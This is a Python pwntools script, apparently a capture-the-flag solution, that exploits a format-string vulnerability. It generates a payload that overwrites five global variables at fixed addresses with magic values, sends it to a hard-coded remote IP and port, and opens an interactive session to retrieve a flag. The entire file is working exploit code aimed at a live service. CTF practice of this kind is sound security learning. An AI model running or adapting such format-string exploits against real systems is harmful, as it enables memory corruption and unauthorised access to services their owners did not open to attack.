from pwn import *

# Configuration
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
# context.log_level = 'debug' 

host = '154.57.164.76'
port = 32419

def get_process():
    return remote(host, port)

# Offset determined via analysis
offset = 6

# Addresses and values to overwrite (extracted from check_db function)
writes = {
    0x40402c: 0xdeadbeef,   # arg1
    0x404034: 0x1337c0de,   # arg2
    0x40403c: 0xf337babe,   # arg3
    0x404044: 0x1337f337,   # arg4
    0x40404c: 0xfadeeeed    # arg5
}

log.info("Generating payload...")
# Generate the format string payload to overwrite the 5 variables
payload = fmtstr_payload(offset, writes, write_size='short', numbwritten=0)
log.info(f"Payload length: {len(payload)}")

try:
    p = get_process()

    log.info("Waiting for the prompt (Server uses usleep, be patient)...")
    
    # Wait specifically for the end of the prompt to handle slow printing
    p.recvuntil(b'gifts :)')
    
    log.info("Prompt received. Sending payload...")
    p.sendline(payload)

    log.success("Payload sent! Switching to interactive mode to retrieve the flag...")
    p.interactive()

except Exception as e:
    log.error(f"Error: {e}")